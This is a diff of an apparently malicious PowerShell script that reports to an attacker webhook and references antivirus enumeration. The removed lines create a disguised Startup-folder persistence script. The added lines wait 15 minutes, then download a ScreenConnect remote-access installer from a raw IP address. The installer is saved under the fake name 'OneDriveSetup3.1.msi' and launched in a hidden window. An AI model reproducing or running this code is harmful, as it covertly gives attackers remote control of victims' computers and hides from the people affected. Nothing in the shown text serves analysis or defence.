@@ -269,27 +269,26 @@ Installed Antivirus Products (By Path):
             Send-WebhookMessage -Message "Error downloading or executing $selectedExe : $errorMessage"
         }
     } else {
-        # Create startup script for persistence
         try {
-            $startupFolder = Join-Path -Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Startup'
-            $startupScriptPath = Join-Path -Path $startupFolder -ChildPath 'UpdateCheck.ps1'
-            $startupScriptContent = @"
-try {
-    `$msiDownloadUrl = 'http://87.121.84.32:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
-    `$msiFilePath = Join-Path -Path `$env:TEMP -ChildPath 'OneDriveSetup3.1.msi'
-    Invoke-WebRequest -Uri `$msiDownloadUrl -OutFile `$msiFilePath -UseBasicParsing -ErrorAction Stop | Out-Null
-    Start-Process -FilePath `$msiFilePath -WindowStyle Hidden -ErrorAction Stop | Out-Null
-} catch {
-    `$errorMessage = `$_.ToString() -replace '[^\w\s\.\:\\]', ''
-}
-"@
-            Set-Content -Path $startupScriptPath -Value $startupScriptContent -ErrorAction Stop
-            Send-WebhookMessage -Message "Created startup script at $startupScriptPath (non-admin)"
-        } catch {
-            $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
-            Send-WebhookMessage -Message "Error creating startup script $startupScriptPath : $errorMessage"
+            Start-Sleep -Minutes 15
+            $msiDownloadUrl = 'http://87.121.84.32:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
+            $msiFilePath = Join-Path -Path $env:TEMP -ChildPath 'OneDriveSetup3.1.msi'
+
+            if (Test-Path -Path $msiFilePath) {
+                Remove-Item -Path $msiFilePath -Force -ErrorAction Stop
+                Send-WebhookMessage -Message "Existing MSI file deleted: $msiFilePath"
+            }
+
+            Invoke-WebRequest -Uri $msiDownloadUrl -OutFile $msiFilePath -UseBasicParsing -ErrorAction Stop | Out-Null
+            
+            Start-Process -FilePath $msiFilePath -WindowStyle Hidden -ErrorAction Stop | Out-Null
+            
+            Send-WebhookMessage -Message "Downloaded and executed MSI from $msiDownloadUrl"
         }
-    }
+        catch {
+            $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+            Send-WebhookMessage -Message "Error downloading or executing MSI: $errorMessage"
+        }
     Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 } catch {
     $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
